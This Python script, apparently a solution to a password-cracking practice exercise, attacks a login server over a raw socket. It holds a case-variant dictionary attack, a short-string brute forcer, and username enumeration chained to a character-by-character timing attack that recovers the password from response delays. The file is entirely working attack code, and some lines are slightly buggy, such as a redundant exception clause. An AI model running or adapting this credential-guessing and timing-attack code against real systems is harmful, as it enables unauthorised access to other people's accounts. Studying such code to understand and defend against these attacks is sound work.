import socket
import itertools
from sys import argv
import json
import datetime

script, host, port = argv


def with_password_list():
    password_list = []
    with open("passwords.txt", "r") as file:
        for lines in file:
            lines = lines.replace("\n", "")
            password_list.append(lines)
        file.close()
    for passwords in password_list:
        word = list(passwords)
        cases = ("lower", "upper")
        for i in itertools.product(cases, repeat=len(word)):
            index = 0
            password = []
            for j in i:
                if j == "lower":
                    password.append(word[index])
                else:
                    password.append(word[index].upper())
                index += 1
            pas = "".join(password)
            pas = pas.encode('utf8')
            try:
                server.send(pas)
            except ConnectionAbortedError or ConnectionAbortedError:
                continue
            try:
                response = server.recv(1024)
            except ConnectionAbortedError or ConnectionAbortedError:
                continue
            response = response.decode('utf8')
            if response == "Connection success!":
                pas = pas.decode('utf8')
                return pas
            if pas.isdigit():
                break


def random_letters():
    a = "abcdefghijklmnopqrstuvwxyz1234567890"
    alpha = list(a)
    count = 0
    for j in range(1,4):
        for i in itertools.product(alpha, repeat=j):
            count += 1
            if count >= 1000001:
                break
            else:
                pas = ("".join(i))
                pas = pas.encode('utf8')
                b = server.send(pas)

                response = server.recv(1024)
                response = response.decode('utf8')
                if response == "Connection success!":
                    pas = pas.decode('utf8')
                    return pas


def with_login():
    login = []
    with open("logins.txt", "r") as file:
        for lines in file:
            lines = lines.replace("\n", "")
            login.append(lines)
        file.close()
    log_json = {'login': 'admin', 'password': ' '}

    for log in login:
        log_json['login'] = log
        json_str = json.dumps(log_json)
        json_str = json_str.encode("utf8")
        server.send(json_str)
        response = server.recv(1024)
        response = response.decode("utf8")
        if response == '{"result": "Wrong password!"}':
            return log_pass(log)


def log_pass(login, pas=""):
    log_json = {
        'login': login,
        'password': pas
    }
    a = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOQRSTUVWXYZ1234567890"
    alpha = list(a)
    for letters in alpha:
        log_json['password'] = pas + letters
        json_str = json.dumps(log_json)
        json_str = json_str.encode("utf8")
        start = datetime.datetime.now()
        server.send(json_str)
        response = server.recv(1024)
        response = response.decode("utf8")
        finish = datetime.datetime.now()
        difference = finish - start
        if response == '{"result": "Connection success!"}':
            j = json.dumps(log_json)
            return j
        if difference.microseconds > 100000:
            return log_pass(login, log_json["password"])
        else:
            continue



address = (host, int(port))
server = socket.socket()
server.connect(address)
#print(with_password_list())
#print(random_letters())
print(with_login())
server.close()
